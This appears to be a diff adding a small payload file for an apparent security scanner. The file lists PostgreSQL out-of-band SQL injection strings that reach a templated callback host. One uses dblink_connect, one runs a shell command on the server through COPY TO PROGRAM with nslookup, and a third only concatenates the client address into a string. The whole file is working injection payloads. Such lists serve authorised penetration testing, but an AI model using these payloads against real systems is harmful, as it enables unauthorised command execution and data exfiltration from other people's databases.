@@ -1,0 +1,5 @@
+# PostgreSQL OOB payloads - requires superuser or dblink extension
+# {{CALLBACK}} replaced with callback host
+'; SELECT dblink_connect('host={{CALLBACK}} dbname=x'); --
+'; COPY (SELECT '') TO PROGRAM 'nslookup {{CALLBACK}}'; --
+'; SELECT inet_client_addr()::text||'.'||'{{CALLBACK}}'::text; --
